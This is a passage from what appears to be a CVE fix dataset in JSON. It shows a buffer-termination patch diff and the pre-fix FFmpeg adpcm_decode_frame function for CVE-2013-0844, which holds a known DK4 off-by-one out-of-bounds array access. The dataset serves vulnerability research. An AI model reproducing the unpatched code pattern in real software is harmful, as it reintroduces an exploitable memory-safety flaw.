        "diff_func": "--- func_before\n+++ func_after\n@@ -9,7 +9,10 @@\n \tchar *p2;\n \tstruct debug_data *d = f->private_data;\n \n-\tpdata = kmalloc(cnt, GFP_KERNEL);\n+\tif (cnt == 0)\n+\t\treturn 0;\n+\n+\tpdata = kmalloc(cnt + 1, GFP_KERNEL);\n \tif (pdata == NULL)\n \t\treturn 0;\n \n@@ -18,6 +21,7 @@\n \t\tkfree(pdata);\n \t\treturn 0;\n \t}\n+\tpdata[cnt] = '\\0';\n \n \tp0 = pdata;\n \tfor (i = 0; i < num_of_items; i++) {",
        "diff_line_info": {
            "deleted_lines": [
                "\tpdata = kmalloc(cnt, GFP_KERNEL);"
            ],
            "added_lines": [
                "\tif (cnt == 0)",
                "\t\treturn 0;",
                "",
                "\tpdata = kmalloc(cnt + 1, GFP_KERNEL);",
                "\tpdata[cnt] = '\\0';"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0844",
        "func_name": "ffmpeg/adpcm_decode_frame",
        "description": "Off-by-one error in the adpcm_decode_frame function in libavcodec/adpcm.c in FFmpeg before 1.0.4 allows remote attackers to have an unspecified impact via crafted DK4 data, which triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=f18c873ab5ee3c78d00fdcc2582b39c133faecb4",
        "commit_title": "",
        "commit_text": "adpcm: fix off by 1 error and out of array access in DK4  ",
        "func_before": "static int adpcm_decode_frame(AVCodecContext *avctx, void *data,\n                              int *got_frame_ptr, AVPacket *avpkt)\n{\n    const uint8_t *buf = avpkt->data;\n    int buf_size = avpkt->size;\n    ADPCMDecodeContext *c = avctx->priv_data;\n    ADPCMChannelStatus *cs;\n    int n, m, channel, i;\n    short *samples;\n    int16_t **samples_p;\n    int st; /* stereo */\n    int count1, count2;\n    int nb_samples, coded_samples, ret;\n    GetByteContext gb;\n\n    bytestream2_init(&gb, buf, buf_size);\n    nb_samples = get_nb_samples(avctx, &gb, buf_size, &coded_samples);\n    if (nb_samples <= 0) {\n        av_log(avctx, AV_LOG_ERROR, \"invalid number of samples in packet\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n\n    /* get output buffer */\n    c->frame.nb_samples = nb_samples;\n    if ((ret = ff_get_buffer(avctx, &c->frame)) < 0) {\n        av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n        return ret;\n    }\n    samples = (short *)c->frame.data[0];\n    samples_p = (int16_t **)c->frame.extended_data;\n\n    /* use coded_samples when applicable */\n    /* it is always <= nb_samples, so the output buffer will be large enough */\n    if (coded_samples) {\n        if (coded_samples != nb_samples)\n            av_log(avctx, AV_LOG_WARNING, \"mismatch in coded sample count\\n\");\n        c->frame.nb_samples = nb_samples = coded_samples;\n    }\n\n    st = avctx->channels == 2 ? 1 : 0;\n\n    switch(avctx->codec->id) {\n    case AV_CODEC_ID_ADPCM_IMA_QT:\n        /* In QuickTime, IMA is encoded by chunks of 34 bytes (=64 samples).\n           Channel data is interleaved per-chunk. */\n        for (channel = 0; channel < avctx->channels; channel++) {\n            int predictor;\n            int step_index;\n            cs = &(c->status[channel]);\n            /* (pppppp) (piiiiiii) */\n\n            /* Bits 15-7 are the _top_ 9 bits of the 16-bit initial predictor value */\n            predictor = sign_extend(bytestream2_get_be16u(&gb), 16);\n            step_index = predictor & 0x7F;\n            predictor &= ~0x7F;\n\n            if (cs->step_index == step_index) {\n                int diff = predictor - cs->predictor;\n                if (diff < 0)\n                    diff = - diff;\n                if (diff > 0x7f)\n                    goto update;\n            } else {\n            update:\n                cs->step_index = step_index;\n                cs->predictor = predictor;\n            }\n\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       channel, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n\n            samples = samples_p[channel];\n\n            for (m = 0; m < 64; m += 2) {\n                int byte = bytestream2_get_byteu(&gb);\n                samples[m    ] = adpcm_ima_qt_expand_nibble(cs, byte & 0x0F, 3);\n                samples[m + 1] = adpcm_ima_qt_expand_nibble(cs, byte >> 4  , 3);\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_WAV:\n        for(i=0; i<avctx->channels; i++){\n            cs = &(c->status[i]);\n            cs->predictor = samples_p[i][0] = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n            cs->step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       i, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (n = 0; n < (nb_samples - 1) / 8; n++) {\n            for (i = 0; i < avctx->channels; i++) {\n                cs = &c->status[i];\n                samples = &samples_p[i][1 + n * 8];\n                for (m = 0; m < 8; m += 2) {\n                    int v = bytestream2_get_byteu(&gb);\n                    samples[m    ] = adpcm_ima_expand_nibble(cs, v & 0x0F, 3);\n                    samples[m + 1] = adpcm_ima_expand_nibble(cs, v >> 4  , 3);\n                }\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_4XM:\n        for (i = 0; i < avctx->channels; i++)\n            c->status[i].predictor = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n        for (i = 0; i < avctx->channels; i++) {\n            c->status[i].step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (c->status[i].step_index > 88u) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       i, c->status[i].step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (i = 0; i < avctx->channels; i++) {\n            samples = (int16_t *)c->frame.data[i];\n            cs = &c->status[i];\n            for (n = nb_samples >> 1; n > 0; n--) {\n                int v = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_ima_expand_nibble(cs, v & 0x0F, 4);\n                *samples++ = adpcm_ima_expand_nibble(cs, v >> 4  , 4);\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_MS:\n    {\n        int block_predictor;\n\n        block_predictor = bytestream2_get_byteu(&gb);\n        if (block_predictor > 6) {\n            av_log(avctx, AV_LOG_ERROR, \"ERROR: block_predictor[0] = %d\\n\",\n                   block_predictor);\n            return AVERROR_INVALIDDATA;\n        }\n        c->status[0].coeff1 = ff_adpcm_AdaptCoeff1[block_predictor];\n        c->status[0].coeff2 = ff_adpcm_AdaptCoeff2[block_predictor];\n        if (st) {\n            block_predictor = bytestream2_get_byteu(&gb);\n            if (block_predictor > 6) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: block_predictor[1] = %d\\n\",\n                       block_predictor);\n                return AVERROR_INVALIDDATA;\n            }\n            c->status[1].coeff1 = ff_adpcm_AdaptCoeff1[block_predictor];\n            c->status[1].coeff2 = ff_adpcm_AdaptCoeff2[block_predictor];\n        }\n        c->status[0].idelta = sign_extend(bytestream2_get_le16u(&gb), 16);\n        if (st){\n            c->status[1].idelta = sign_extend(bytestream2_get_le16u(&gb), 16);\n        }\n\n        c->status[0].sample1 = sign_extend(bytestream2_get_le16u(&gb), 16);\n        if (st) c->status[1].sample1 = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[0].sample2 = sign_extend(bytestream2_get_le16u(&gb), 16);\n        if (st) c->status[1].sample2 = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n        *samples++ = c->status[0].sample2;\n        if (st) *samples++ = c->status[1].sample2;\n        *samples++ = c->status[0].sample1;\n        if (st) *samples++ = c->status[1].sample1;\n        for(n = (nb_samples - 2) >> (1 - st); n > 0; n--) {\n            int byte = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ms_expand_nibble(&c->status[0 ], byte >> 4  );\n            *samples++ = adpcm_ms_expand_nibble(&c->status[st], byte & 0x0F);\n        }\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_IMA_DK4:\n        for (channel = 0; channel < avctx->channels; channel++) {\n            cs = &c->status[channel];\n            cs->predictor  = *samples++ = sign_extend(bytestream2_get_le16u(&gb), 16);\n            cs->step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       channel, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0 ], v >> 4  , 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], v & 0x0F, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_DK3:\n    {\n        int last_byte = 0;\n        int nibble;\n        int decode_top_nibble_next = 0;\n        int diff_channel;\n        const int16_t *samples_end = samples + avctx->channels * nb_samples;\n\n        bytestream2_skipu(&gb, 10);\n        c->status[0].predictor  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[1].predictor  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[0].step_index = bytestream2_get_byteu(&gb);\n        c->status[1].step_index = bytestream2_get_byteu(&gb);\n        if (c->status[0].step_index > 88u || c->status[1].step_index > 88u){\n            av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index = %i/%i\\n\",\n                   c->status[0].step_index, c->status[1].step_index);\n            return AVERROR_INVALIDDATA;\n        }\n        /* sign extend the predictors */\n        diff_channel = c->status[1].predictor;\n\n        /* DK3 ADPCM support macro */\n#define DK3_GET_NEXT_NIBBLE() \\\n    if (decode_top_nibble_next) { \\\n        nibble = last_byte >> 4; \\\n        decode_top_nibble_next = 0; \\\n    } else { \\\n        last_byte = bytestream2_get_byteu(&gb); \\\n        nibble = last_byte & 0x0F; \\\n        decode_top_nibble_next = 1; \\\n    }\n\n        while (samples < samples_end) {\n\n            /* for this algorithm, c->status[0] is the sum channel and\n             * c->status[1] is the diff channel */\n\n            /* process the first predictor of the sum channel */\n            DK3_GET_NEXT_NIBBLE();\n            adpcm_ima_expand_nibble(&c->status[0], nibble, 3);\n\n            /* process the diff channel predictor */\n            DK3_GET_NEXT_NIBBLE();\n            adpcm_ima_expand_nibble(&c->status[1], nibble, 3);\n\n            /* process the first pair of stereo PCM samples */\n            diff_channel = (diff_channel + c->status[1].predictor) / 2;\n            *samples++ = c->status[0].predictor + c->status[1].predictor;\n            *samples++ = c->status[0].predictor - c->status[1].predictor;\n\n            /* process the second predictor of the sum channel */\n            DK3_GET_NEXT_NIBBLE();\n            adpcm_ima_expand_nibble(&c->status[0], nibble, 3);\n\n            /* process the second pair of stereo PCM samples */\n            diff_channel = (diff_channel + c->status[1].predictor) / 2;\n            *samples++ = c->status[0].predictor + c->status[1].predictor;\n            *samples++ = c->status[0].predictor - c->status[1].predictor;\n        }\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_IMA_ISS:\n        for (channel = 0; channel < avctx->channels; channel++) {\n            cs = &c->status[channel];\n            cs->predictor  = sign_extend(bytestream2_get_le16u(&gb), 16);\n            cs->step_index = sign_extend(bytestream2_get_le16u(&gb), 16);\n            if (cs->step_index > 88u){\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       channel, cs->step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v1, v2;\n            int v = bytestream2_get_byteu(&gb);\n            /* nibbles are swapped for mono */\n            if (st) {\n                v1 = v >> 4;\n                v2 = v & 0x0F;\n            } else {\n                v2 = v >> 4;\n                v1 = v & 0x0F;\n            }\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0 ], v1, 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], v2, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_APC:\n        while (bytestream2_get_bytes_left(&gb) > 0) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0],  v >> 4  , 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], v & 0x0F, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_OKI:\n        while (bytestream2_get_bytes_left(&gb) > 0) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_oki_expand_nibble(&c->status[0],  v >> 4  );\n            *samples++ = adpcm_ima_oki_expand_nibble(&c->status[st], v & 0x0F);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_WS:\n        if (c->vqa_version == 3) {\n            for (channel = 0; channel < avctx->channels; channel++) {\n                int16_t *smp = samples_p[channel];\n\n                for (n = nb_samples / 2; n > 0; n--) {\n                    int v = bytestream2_get_byteu(&gb);\n                    *smp++ = adpcm_ima_expand_nibble(&c->status[channel], v >> 4  , 3);\n                    *smp++ = adpcm_ima_expand_nibble(&c->status[channel], v & 0x0F, 3);\n                }\n            }\n        } else {\n            for (n = nb_samples / 2; n > 0; n--) {\n                for (channel = 0; channel < avctx->channels; channel++) {\n                    int v = bytestream2_get_byteu(&gb);\n                    *samples++  = adpcm_ima_expand_nibble(&c->status[channel], v >> 4  , 3);\n                    samples[st] = adpcm_ima_expand_nibble(&c->status[channel], v & 0x0F, 3);\n                }\n                samples += avctx->channels;\n            }\n        }\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    case AV_CODEC_ID_ADPCM_XA:\n    {\n        int16_t *out0 = samples_p[0];\n        int16_t *out1 = samples_p[1];\n        int samples_per_block = 28 * (3 - avctx->channels) * 4;\n        int sample_offset = 0;\n        while (bytestream2_get_bytes_left(&gb) >= 128) {\n            if ((ret = xa_decode(avctx, out0, out1, buf + bytestream2_tell(&gb),\n                                 &c->status[0], &c->status[1],\n                                 avctx->channels, sample_offset)) < 0)\n                return ret;\n            bytestream2_skipu(&gb, 128);\n            sample_offset += samples_per_block;\n        }\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_IMA_EA_EACS:\n        for (i=0; i<=st; i++) {\n            c->status[i].step_index = bytestream2_get_le32u(&gb);\n            if (c->status[i].step_index > 88u) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index[%d] = %i\\n\",\n                       i, c->status[i].step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n        for (i=0; i<=st; i++)\n            c->status[i].predictor  = bytestream2_get_le32u(&gb);\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int byte   = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0],  byte >> 4,   3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], byte & 0x0F, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_EA_SEAD:\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int byte = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0],  byte >> 4,   6);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[st], byte & 0x0F, 6);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_EA:\n    {\n        int previous_left_sample, previous_right_sample;\n        int current_left_sample, current_right_sample;\n        int next_left_sample, next_right_sample;\n        int coeff1l, coeff2l, coeff1r, coeff2r;\n        int shift_left, shift_right;\n\n        /* Each EA ADPCM frame has a 12-byte header followed by 30-byte pieces,\n           each coding 28 stereo samples. */\n\n        if(avctx->channels != 2)\n            return AVERROR_INVALIDDATA;\n\n        current_left_sample   = sign_extend(bytestream2_get_le16u(&gb), 16);\n        previous_left_sample  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        current_right_sample  = sign_extend(bytestream2_get_le16u(&gb), 16);\n        previous_right_sample = sign_extend(bytestream2_get_le16u(&gb), 16);\n\n        for (count1 = 0; count1 < nb_samples / 28; count1++) {\n            int byte = bytestream2_get_byteu(&gb);\n            coeff1l = ea_adpcm_table[ byte >> 4       ];\n            coeff2l = ea_adpcm_table[(byte >> 4  ) + 4];\n            coeff1r = ea_adpcm_table[ byte & 0x0F];\n            coeff2r = ea_adpcm_table[(byte & 0x0F) + 4];\n\n            byte = bytestream2_get_byteu(&gb);\n            shift_left  = 20 - (byte >> 4);\n            shift_right = 20 - (byte & 0x0F);\n\n            for (count2 = 0; count2 < 28; count2++) {\n                byte = bytestream2_get_byteu(&gb);\n                next_left_sample  = sign_extend(byte >> 4, 4) << shift_left;\n                next_right_sample = sign_extend(byte,      4) << shift_right;\n\n                next_left_sample = (next_left_sample +\n                    (current_left_sample * coeff1l) +\n                    (previous_left_sample * coeff2l) + 0x80) >> 8;\n                next_right_sample = (next_right_sample +\n                    (current_right_sample * coeff1r) +\n                    (previous_right_sample * coeff2r) + 0x80) >> 8;\n\n                previous_left_sample = current_left_sample;\n                current_left_sample = av_clip_int16(next_left_sample);\n                previous_right_sample = current_right_sample;\n                current_right_sample = av_clip_int16(next_right_sample);\n                *samples++ = current_left_sample;\n                *samples++ = current_right_sample;\n            }\n        }\n\n        bytestream2_skip(&gb, 2); // Skip terminating 0x0000\n\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_EA_MAXIS_XA:\n    {\n        int coeff[2][2], shift[2];\n\n        for(channel = 0; channel < avctx->channels; channel++) {\n            int byte = bytestream2_get_byteu(&gb);\n            for (i=0; i<2; i++)\n                coeff[channel][i] = ea_adpcm_table[(byte >> 4) + 4*i];\n            shift[channel] = 20 - (byte & 0x0F);\n        }\n        for (count1 = 0; count1 < nb_samples / 2; count1++) {\n            int byte[2];\n\n            byte[0] = bytestream2_get_byteu(&gb);\n            if (st) byte[1] = bytestream2_get_byteu(&gb);\n            for(i = 4; i >= 0; i-=4) { /* Pairwise samples LL RR (st) or LL LL (mono) */\n                for(channel = 0; channel < avctx->channels; channel++) {\n                    int sample = sign_extend(byte[channel] >> i, 4) << shift[channel];\n                    sample = (sample +\n                             c->status[channel].sample1 * coeff[channel][0] +\n                             c->status[channel].sample2 * coeff[channel][1] + 0x80) >> 8;\n                    c->status[channel].sample2 = c->status[channel].sample1;\n                    c->status[channel].sample1 = av_clip_int16(sample);\n                    *samples++ = c->status[channel].sample1;\n                }\n            }\n        }\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_EA_R1:\n    case AV_CODEC_ID_ADPCM_EA_R2:\n    case AV_CODEC_ID_ADPCM_EA_R3: {\n        /* channel numbering\n           2chan: 0=fl, 1=fr\n           4chan: 0=fl, 1=rl, 2=fr, 3=rr\n           6chan: 0=fl, 1=c,  2=fr, 3=rl,  4=rr, 5=sub */\n        const int big_endian = avctx->codec->id == AV_CODEC_ID_ADPCM_EA_R3;\n        int previous_sample, current_sample, next_sample;\n        int coeff1, coeff2;\n        int shift;\n        unsigned int channel;\n        uint16_t *samplesC;\n        int count = 0;\n        int offsets[6];\n\n        for (channel=0; channel<avctx->channels; channel++)\n            offsets[channel] = (big_endian ? bytestream2_get_be32(&gb) :\n                                             bytestream2_get_le32(&gb)) +\n                               (avctx->channels + 1) * 4;\n\n        for (channel=0; channel<avctx->channels; channel++) {\n            bytestream2_seek(&gb, offsets[channel], SEEK_SET);\n            samplesC = samples_p[channel];\n\n            if (avctx->codec->id == AV_CODEC_ID_ADPCM_EA_R1) {\n                current_sample  = sign_extend(bytestream2_get_le16(&gb), 16);\n                previous_sample = sign_extend(bytestream2_get_le16(&gb), 16);\n            } else {\n                current_sample  = c->status[channel].predictor;\n                previous_sample = c->status[channel].prev_sample;\n            }\n\n            for (count1 = 0; count1 < nb_samples / 28; count1++) {\n                int byte = bytestream2_get_byte(&gb);\n                if (byte == 0xEE) {  /* only seen in R2 and R3 */\n                    current_sample  = sign_extend(bytestream2_get_be16(&gb), 16);\n                    previous_sample = sign_extend(bytestream2_get_be16(&gb), 16);\n\n                    for (count2=0; count2<28; count2++)\n                        *samplesC++ = sign_extend(bytestream2_get_be16(&gb), 16);\n                } else {\n                    coeff1 = ea_adpcm_table[ byte >> 4     ];\n                    coeff2 = ea_adpcm_table[(byte >> 4) + 4];\n                    shift = 20 - (byte & 0x0F);\n\n                    for (count2=0; count2<28; count2++) {\n                        if (count2 & 1)\n                            next_sample = sign_extend(byte,    4) << shift;\n                        else {\n                            byte = bytestream2_get_byte(&gb);\n                            next_sample = sign_extend(byte >> 4, 4) << shift;\n                        }\n\n                        next_sample += (current_sample  * coeff1) +\n                                       (previous_sample * coeff2);\n                        next_sample = av_clip_int16(next_sample >> 8);\n\n                        previous_sample = current_sample;\n                        current_sample  = next_sample;\n                        *samplesC++ = current_sample;\n                    }\n                }\n            }\n            if (!count) {\n                count = count1;\n            } else if (count != count1) {\n                av_log(avctx, AV_LOG_WARNING, \"per-channel sample count mismatch\\n\");\n                count = FFMAX(count, count1);\n            }\n\n            if (avctx->codec->id != AV_CODEC_ID_ADPCM_EA_R1) {\n                c->status[channel].predictor   = current_sample;\n                c->status[channel].prev_sample = previous_sample;\n            }\n        }\n\n        c->frame.nb_samples = count * 28;\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_EA_XAS:\n        for (channel=0; channel<avctx->channels; channel++) {\n            int coeff[2][4], shift[4];\n            int16_t *s = samples_p[channel];\n            for (n = 0; n < 4; n++, s += 32) {\n                int val = sign_extend(bytestream2_get_le16u(&gb), 16);\n                for (i=0; i<2; i++)\n                    coeff[i][n] = ea_adpcm_table[(val&0x0F)+4*i];\n                s[0] = val & ~0x0F;\n\n                val = sign_extend(bytestream2_get_le16u(&gb), 16);\n                shift[n] = 20 - (val & 0x0F);\n                s[1] = val & ~0x0F;\n            }\n\n            for (m=2; m<32; m+=2) {\n                s = &samples_p[channel][m];\n                for (n = 0; n < 4; n++, s += 32) {\n                    int level, pred;\n                    int byte = bytestream2_get_byteu(&gb);\n\n                    level = sign_extend(byte >> 4, 4) << shift[n];\n                    pred  = s[-1] * coeff[0][n] + s[-2] * coeff[1][n];\n                    s[0]  = av_clip_int16((level + pred + 0x80) >> 8);\n\n                    level = sign_extend(byte, 4) << shift[n];\n                    pred  = s[0] * coeff[0][n] + s[-1] * coeff[1][n];\n                    s[1]  = av_clip_int16((level + pred + 0x80) >> 8);\n                }\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_AMV:\n        c->status[0].predictor = sign_extend(bytestream2_get_le16u(&gb), 16);\n        c->status[0].step_index = bytestream2_get_le16u(&gb);\n        bytestream2_skipu(&gb, 4);\n        if (c->status[0].step_index > 88u) {\n            av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index = %i\\n\",\n                   c->status[0].step_index);\n            return AVERROR_INVALIDDATA;\n        }\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0], v >> 4, 3);\n            *samples++ = adpcm_ima_expand_nibble(&c->status[0], v & 0xf, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_IMA_SMJPEG:\n        for (i = 0; i < avctx->channels; i++) {\n            c->status[i].predictor = sign_extend(bytestream2_get_be16u(&gb), 16);\n            c->status[i].step_index = bytestream2_get_byteu(&gb);\n            bytestream2_skipu(&gb, 1);\n            if (c->status[i].step_index > 88u) {\n                av_log(avctx, AV_LOG_ERROR, \"ERROR: step_index = %i\\n\",\n                       c->status[i].step_index);\n                return AVERROR_INVALIDDATA;\n            }\n        }\n\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n\n            *samples++ = adpcm_ima_qt_expand_nibble(&c->status[0 ], v >> 4, 3);\n            *samples++ = adpcm_ima_qt_expand_nibble(&c->status[st], v & 0xf, 3);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_CT:\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_ct_expand_nibble(&c->status[0 ], v >> 4  );\n            *samples++ = adpcm_ct_expand_nibble(&c->status[st], v & 0x0F);\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_SBPRO_4:\n    case AV_CODEC_ID_ADPCM_SBPRO_3:\n    case AV_CODEC_ID_ADPCM_SBPRO_2:\n        if (!c->status[0].step_index) {\n            /* the first byte is a raw sample */\n            *samples++ = 128 * (bytestream2_get_byteu(&gb) - 0x80);\n            if (st)\n                *samples++ = 128 * (bytestream2_get_byteu(&gb) - 0x80);\n            c->status[0].step_index = 1;\n            nb_samples--;\n        }\n        if (avctx->codec->id == AV_CODEC_ID_ADPCM_SBPRO_4) {\n            for (n = nb_samples >> (1 - st); n > 0; n--) {\n                int byte = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                       byte >> 4,   4, 0);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[st],\n                                                       byte & 0x0F, 4, 0);\n            }\n        } else if (avctx->codec->id == AV_CODEC_ID_ADPCM_SBPRO_3) {\n            for (n = nb_samples / 3; n > 0; n--) {\n                int byte = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                        byte >> 5        , 3, 0);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                       (byte >> 2) & 0x07, 3, 0);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                        byte & 0x03,       2, 0);\n            }\n        } else {\n            for (n = nb_samples >> (2 - st); n > 0; n--) {\n                int byte = bytestream2_get_byteu(&gb);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                        byte >> 6        , 2, 2);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[st],\n                                                       (byte >> 4) & 0x03, 2, 2);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[0],\n                                                       (byte >> 2) & 0x03, 2, 2);\n                *samples++ = adpcm_sbpro_expand_nibble(&c->status[st],\n                                                        byte & 0x03,       2, 2);\n            }\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_SWF:\n        adpcm_swf_decode(avctx, buf, buf_size, samples);\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    case AV_CODEC_ID_ADPCM_YAMAHA:\n        for (n = nb_samples >> (1 - st); n > 0; n--) {\n            int v = bytestream2_get_byteu(&gb);\n            *samples++ = adpcm_yamaha_expand_nibble(&c->status[0 ], v & 0x0F);\n            *samples++ = adpcm_yamaha_expand_nibble(&c->status[st], v >> 4  );\n        }\n        break;\n    case AV_CODEC_ID_ADPCM_AFC:\n    {\n        int samples_per_block;\n        int blocks;\n\n        if (avctx->extradata && avctx->extradata_size == 1 && avctx->extradata[0]) {\n            samples_per_block = avctx->extradata[0] / 16;\n            blocks = nb_samples / avctx->extradata[0];\n        } else {\n            samples_per_block = nb_samples / 16;\n            blocks = 1;\n        }\n\n        for (m = 0; m < blocks; m++) {\n        for (channel = 0; channel < avctx->channels; channel++) {\n            int prev1 = c->status[channel].sample1;\n            int prev2 = c->status[channel].sample2;\n\n            samples = samples_p[channel] + m * 16;\n            /* Read in every sample for this channel.  */\n            for (i = 0; i < samples_per_block; i++) {\n                int byte = bytestream2_get_byteu(&gb);\n                int scale = 1 << (byte >> 4);\n                int index = byte & 0xf;\n                int factor1 = ff_adpcm_afc_coeffs[0][index];\n                int factor2 = ff_adpcm_afc_coeffs[1][index];\n\n                /* Decode 16 samples.  */\n                for (n = 0; n < 16; n++) {\n                    int32_t sampledat;\n\n                    if (n & 1) {\n                        sampledat = sign_extend(byte, 4);\n                    } else {\n                        byte = bytestream2_get_byteu(&gb);\n                        sampledat = sign_extend(byte >> 4, 4);\n                    }\n\n                    sampledat = ((prev1 * factor1 + prev2 * factor2) +\n                                 ((sampledat * scale) << 11)) >> 11;\n                    *samples = av_clip_int16(sampledat);\n                    prev2 = prev1;\n                    prev1 = *samples++;\n                }\n            }\n\n            c->status[channel].sample1 = prev1;\n            c->status[channel].sample2 = prev2;\n        }\n        }\n        bytestream2_seek(&gb, 0, SEEK_END);\n        break;\n    }\n    case AV_CODEC_ID_ADPCM_THP:\n    {\n        int table[6][16];\n        int ch;\n\n        for (i = 0; i < avctx->channels; i++)\n            for (n = 0; n < 16; n++)\n                table[i][n] = sign_extend(bytestream2_get_be16u(&gb), 16);\n\n        /* Initialize the previous sample.  */\n        for (i = 0; i < avctx->channels; i++) {\n            c->status[i].sample1 = sign_extend(bytestream2_get_be16u(&gb), 16);\n            c->status[i].sample2 = sign_extend(bytestream2_get_be16u(&gb), 16);\n        }\n\n        for (ch = 0; ch < avctx->channels; ch++) {\n            samples = samples_p[ch];\n\n            /* Read in every sample for this channel.  */\n            for (i = 0; i < nb_samples / 14; i++) {\n                int byte = bytestream2_get_byteu(&gb);\n                int index = (byte >> 4) & 7;\n                unsigned int exp = byte & 0x0F;\n                int factor1 = table[ch][index * 2];\n                int factor2 = table[ch][index * 2 + 1];\n\n                /* Decode 14 samples.  */\n                for (n = 0; n < 14; n++) {\n                    int32_t sampledat;\n\n                    if (n & 1) {\n                        sampledat = sign_extend(byte, 4);\n                    } else {\n                        byte = bytestream2_get_byteu(&gb);\n                        sampledat = sign_extend(byte >> 4, 4);\n                    }\n\n                    sampledat = ((c->status[ch].sample1 * factor1\n                                + c->status[ch].sample2 * factor2) >> 11) + (sampledat << exp);\n                    *samples = av_clip_int16(sampledat);\n                    c->status[ch].sample2 = c->status[ch].sample1;\n                    c->status[ch].sample1 = *samples++;\n                }\n            }\n        }\n        break;\n    }\n\n    default:\n        return -1;\n    }\n\n    if (avpkt->size && bytestream2_tell(&gb) == 0) {\n        av_log(avctx, AV_LOG_ERROR, \"Nothing consumed\\n\");\n        return 